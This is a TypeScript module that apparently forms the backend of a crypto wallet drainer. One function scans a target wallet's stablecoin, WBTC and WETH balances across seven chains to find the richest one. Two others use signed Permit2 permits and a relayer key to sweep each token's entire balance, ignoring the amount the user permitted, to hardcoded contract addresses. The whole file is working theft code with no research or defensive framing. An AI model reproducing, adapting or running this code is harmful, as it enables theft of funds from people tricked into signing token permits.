import { createPublicClient, createWalletClient, http } from 'viem';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;

const CHAIN_CONTRACTS: Record<number, string> = {
  1: "0xA45d31549C33b44ac9C395d8983d01Ae1b21656E",
  56: "0x45abA44A5f1F6C66a5b688E99E4A7c4f06c73DE4",
  137: "0xd933CDf4a9Ac63a84AdE7D34890A86fF46903bD9",
  42161: "0x2c8e1A8F672AdC01F2699e5F042306F6Ab082A27",
  10: "0x5a1C1646052476d8cF57325A25B08bc1013024e2",
  43114: "0x4A085d4e3D7c71d2618b5343b8161C54E2f52419",
  8453: "0x8C4d05b4ec89Db4b67F569bFc59d769B07558444",
};

function getContractForChain(chainId: number): string | null {
  return CHAIN_CONTRACTS[chainId] || null;
}

const ERC20_ABI = [
  {
    inputs: [{ name: "owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" }
    ],
    name: "allowance",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function"
  }
] as const;

const PERMIT2_SINGLE_ABI = [
  {
    inputs: [
      {
        components: [
          {
            components: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint256" }
            ],
            name: "permitted",
            type: "tuple"
          },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        name: "permit",
        type: "tuple"
      },
      {
        components: [
          { name: "to", type: "address" },
          { name: "requestedAmount", type: "uint256" }
        ],
        name: "transferDetails",
        type: "tuple"
      },
      { name: "owner", type: "address" },
      { name: "signature", type: "bytes" }
    ],
    name: "permitTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
] as const;

const PERMIT2_BATCH_ABI = [
  {
    inputs: [
      {
        components: [
          {
            components: [
              { name: "token", type: "address" },
              { name: "amount", type: "uint256" }
            ],
            name: "permitted",
            type: "tuple[]"
          },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        name: "permit",
        type: "tuple"
      },
      {
        components: [
          { name: "to", type: "address" },
          { name: "requestedAmount", type: "uint256" }
        ],
        name: "transferDetails",
        type: "tuple[]"
      },
      { name: "owner", type: "address" },
      { name: "signature", type: "bytes" }
    ],
    name: "permitTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function"
  }
] as const;

const chainConfigs: Record<number, { chain: any; rpcUrl: string }> = {
  1: { chain: mainnet, rpcUrl: 'https://eth.llamarpc.com' },
  56: { chain: bsc, rpcUrl: 'https://bsc-dataseed.binance.org' },
  137: { chain: polygon, rpcUrl: 'https://polygon-rpc.com' },
  42161: { chain: arbitrum, rpcUrl: 'https://arb1.arbitrum.io/rpc' },
  10: { chain: optimism, rpcUrl: 'https://mainnet.optimism.io' },
  43114: { chain: avalanche, rpcUrl: 'https://api.avax.network/ext/bc/C/rpc' },
  8453: { chain: base, rpcUrl: 'https://mainnet.base.org' },
};

function getAccount() {
  const privateKey = process.env.RELAYER_PRIVATE_KEY;
  if (!privateKey) throw new Error('RELAYER_PRIVATE_KEY not configured');
  return privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
}

export function getRelayerAddress(): string | null {
  try {
    const account = getAccount();
    return account.address;
  } catch {
    return null;
  }
}

export { getContractForChain, CHAIN_CONTRACTS };

export async function executePermit2BatchTransfer(params: {
  chainId: number;
  owner: string;
  permitted: { token: string; amount: string }[];
  nonce: string;
  deadline: string;
  signature: string;
}): Promise<{ success: boolean; txHash?: string; error?: string; transfers: { token: string; amount: string; success: boolean }[] }> {
  const transfers: { token: string; amount: string; success: boolean }[] = [];

  try {
    const { chainId, owner, permitted, nonce, deadline, signature } = params;
    const chainConfig = chainConfigs[chainId];

    if (!chainConfig) {
      return { success: false, error: `Unsupported chain: ${chainId}`, transfers };
    }

    const account = getAccount();

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const walletClient = createWalletClient({
      account,
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const contractAddress = getContractForChain(chainId);
    if (!contractAddress) {
      return { success: false, error: `No contract deployed for chain ${chainId}`, transfers };
    }

    const ownerAddr = owner as `0x${string}`;
    const transferDetails: { to: `0x${string}`; requestedAmount: bigint }[] = [];

    for (const p of permitted) {
      const tokenAddr = p.token as `0x${string}`;
      try {
        const balance = await publicClient.readContract({
          address: tokenAddr,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [ownerAddr],
        });

        console.log(`[Permit2] Balance for ${p.token} on chain ${chainId}: ${balance}`);

        transferDetails.push({
          to: contractAddress as `0x${string}`,
          requestedAmount: balance,
        });

        transfers.push({
          token: p.token,
          amount: balance.toString(),
          success: balance > BigInt(0),
        });
      } catch (err: any) {
        console.error(`[Permit2] Error checking balance for ${p.token}:`, err?.message);
        transferDetails.push({
          to: contractAddress as `0x${string}`,
          requestedAmount: BigInt(0),
        });
        transfers.push({ token: p.token, amount: '0', success: false });
      }
    }

    const hasTokensToTransfer = transferDetails.some(t => t.requestedAmount > BigInt(0));
    if (!hasTokensToTransfer) {
      console.log('[Permit2] No tokens to transfer (all balances are 0)');
      return { success: true, transfers, error: 'No token balances found' };
    }

    console.log(`[Permit2] Executing batch transfer via contract ${contractAddress} for ${permitted.length} tokens`);
    console.log(`[Permit2] Tokens with balance: ${transfers.filter(t => t.success).map(t => t.token).join(', ')}`);
    console.log(`[Permit2] Tokens with zero balance (will transfer 0): ${transfers.filter(t => !t.success).map(t => t.token).join(', ')}`);

    const permitArg = {
      permitted: permitted.map(p => ({
        token: p.token as `0x${string}`,
        amount: BigInt(p.amount),
      })),
      nonce: BigInt(nonce),
      deadline: BigInt(deadline),
    };

    const EXECUTE_PERMIT_BATCH_ABI = [
      {
        inputs: [
          {
            components: [
              {
                components: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint256" }
                ],
                name: "permitted",
                type: "tuple[]"
              },
              { name: "nonce", type: "uint256" },
              { name: "deadline", type: "uint256" }
            ],
            name: "permit",
            type: "tuple"
          },
          {
            components: [
              { name: "to", type: "address" },
              { name: "requestedAmount", type: "uint256" }
            ],
            name: "transferDetails",
            type: "tuple[]"
          },
          { name: "from", type: "address" },
          { name: "signature", type: "bytes" }
        ],
        name: "executePermitBatch",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function"
      }
    ] as const;

    const txHash = await walletClient.writeContract({
      address: contractAddress as `0x${string}`,
      abi: EXECUTE_PERMIT_BATCH_ABI,
      functionName: 'executePermitBatch',
      args: [
        permitArg,
        transferDetails,
        ownerAddr,
        signature as `0x${string}`,
      ],
      chain: chainConfig.chain,
    });

    console.log(`[Permit2] Transaction submitted: ${txHash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });

    if (receipt.status === 'success') {
      console.log(`[Permit2] Batch transfer successful: ${txHash}`);
      return { success: true, txHash, transfers };
    } else {
      return { success: false, error: 'Transaction reverted', txHash, transfers };
    }
  } catch (error: any) {
    console.error('[Permit2] Error:', error?.message || error);
    return { success: false, error: error?.message || 'Unknown error', transfers };
  }
}

export async function executePermit2SingleTransfer(params: {
  chainId: number;
  owner: string;
  token: string;
  amount: string;
  nonce: string;
  deadline: string;
  signature: string;
}): Promise<{ success: boolean; txHash?: string; error?: string; transferredAmount?: string }> {
  try {
    const { chainId, owner, token, amount, nonce, deadline, signature } = params;
    const chainConfig = chainConfigs[chainId];

    if (!chainConfig) {
      return { success: false, error: `Unsupported chain: ${chainId}` };
    }

    const account = getAccount();

    const publicClient = createPublicClient({
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const walletClient = createWalletClient({
      account,
      chain: chainConfig.chain,
      transport: http(chainConfig.rpcUrl),
    });

    const contractAddress = getContractForChain(chainId);
    if (!contractAddress) {
      return { success: false, error: `No contract deployed for chain ${chainId}` };
    }

    const ownerAddr = owner as `0x${string}`;
    const tokenAddr = token as `0x${string}`;

    const balance = await publicClient.readContract({
      address: tokenAddr,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [ownerAddr],
    });

    console.log(`[Permit2] Balance for ${token}: ${balance}`);

    if (balance === BigInt(0)) {
      return { success: true, error: 'No balance', transferredAmount: '0' };
    }

    const permitArg = {
      permitted: {
        token: tokenAddr,
        amount: BigInt(amount),
      },
      nonce: BigInt(nonce),
      deadline: BigInt(deadline),
    };

    const transferDetailsArg = {
      to: contractAddress as `0x${string}`,
      requestedAmount: balance,
    };

    const txHash = await walletClient.writeContract({
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_SINGLE_ABI,
      functionName: 'permitTransferFrom',
      args: [
        permitArg,
        transferDetailsArg,
        ownerAddr,
        signature as `0x${string}`,
      ],
      chain: chainConfig.chain,
    });

    console.log(`[Permit2] Transaction submitted: ${txHash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });

    if (receipt.status === 'success') {
      console.log(`[Permit2] Transfer successful: ${txHash}`);
      return { success: true, txHash, transferredAmount: balance.toString() };
    } else {
      return { success: false, error: 'Transaction reverted', txHash };
    }
  } catch (error: any) {
    console.error('[Permit2] Error:', error?.message || error);
    return { success: false, error: error?.message || 'Unknown error' };
  }
}

const CHAIN_TOKEN_ADDRESSES: Record<number, Array<{ symbol: string; address: string }>> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
  ],
  56: [
    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
    { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
    { symbol: "DAI", address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3" },
    { symbol: "WBTC", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c" },
    { symbol: "WETH", address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8" },
  ],
  137: [
    { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" },
    { symbol: "USDC", address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359" },
    { symbol: "DAI", address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063" },
    { symbol: "WBTC", address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6" },
    { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619" },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" },
    { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1" },
    { symbol: "WBTC", address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f" },
    { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1" },
  ],
  10: [
    { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58" },
    { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
    { symbol: "DAI", address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1" },
    { symbol: "WBTC", address: "0x68f180fcCe6836688e9084f035309E29Bf0A2095" },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
  ],
  43114: [
    { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
    { symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
    { symbol: "DAI", address: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70" },
    { symbol: "WBTC", address: "0x50b7545627a5162F82A992c33b87aDc75187B218" },
    { symbol: "WETH", address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB" },
  ],
  8453: [
    { symbol: "USDT", address: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2" },
    { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
    { symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb" },
    { symbol: "WBTC", address: "0x0555E30da8f98308EdB960aa94C0Db47230d2B9c" },
    { symbol: "WETH", address: "0x4200000000000000000000000000000000000006" },
  ],
};

const ERC20_BALANCE_ABI = [
  {
    inputs: [{ name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
] as const;

export async function scanWalletBalances(walletAddress: string): Promise<{
  bestChainId: number | null;
  chains: Array<{ chainId: number; chainName: string; totalValue: number; tokens: Array<{ symbol: string; balance: string }> }>;
}> {
  const chainNames: Record<number, string> = {
    1: "Ethereum", 56: "BNB Chain", 137: "Polygon",
    42161: "Arbitrum", 10: "Optimism", 43114: "Avalanche", 8453: "Base",
  };

  const scanPromises = Object.entries(chainConfigs).map(async ([chainIdStr, config]) => {
    const cid = Number(chainIdStr);
    const tokens = CHAIN_TOKEN_ADDRESSES[cid];
    if (!tokens) return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue: 0, tokens: [] };

    try {
      const publicClient = createPublicClient({
        chain: config.chain,
        transport: http(config.rpcUrl),
      });

      const balanceCalls = tokens.map(token => ({
        address: token.address as `0x${string}`,
        abi: ERC20_BALANCE_ABI,
        functionName: 'balanceOf' as const,
        args: [walletAddress as `0x${string}`],
      }));

      const balances = await publicClient.multicall({ contracts: balanceCalls });

      let totalValue = 0;
      const tokenResults: Array<{ symbol: string; balance: string }> = [];

      for (let i = 0; i < tokens.length; i++) {
        const result = balances[i];
        if (result.status === 'success' && result.result) {
          const rawBalance = BigInt(result.result as any);
          if (rawBalance > BigInt(0)) {
            const symbol = tokens[i].symbol;
            let decimals = 18;
            if (symbol === "USDT" || symbol === "USDC") decimals = 6;
            if (symbol === "WBTC") decimals = 8;
            const humanBalance = Number(rawBalance) / Math.pow(10, decimals);
            tokenResults.push({ symbol, balance: humanBalance.toString() });

            if (symbol === "USDT" || symbol === "USDC" || symbol === "DAI") {
              totalValue += humanBalance;
            } else if (symbol === "WETH") {
              totalValue += humanBalance * 2500;
            } else if (symbol === "WBTC") {
              totalValue += humanBalance * 60000;
            }
          }
        }
      }

      return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue, tokens: tokenResults };
    } catch (err: any) {
      console.log(`[Scan] Failed to scan chain ${cid}: ${err?.message}`);
      return { chainId: cid, chainName: chainNames[cid] || `Chain ${cid}`, totalValue: 0, tokens: [] };
    }
  });

  const results = await Promise.all(scanPromises);
  results.sort((a, b) => b.totalValue - a.totalValue);
  const bestChainId = results.length > 0 && results[0].totalValue > 0 ? results[0].chainId : null;

  console.log(`[Scan] Wallet ${walletAddress} - best chain: ${bestChainId} (${chainNames[bestChainId || 0] || 'none'})`);

  return { bestChainId, chains: results };
}
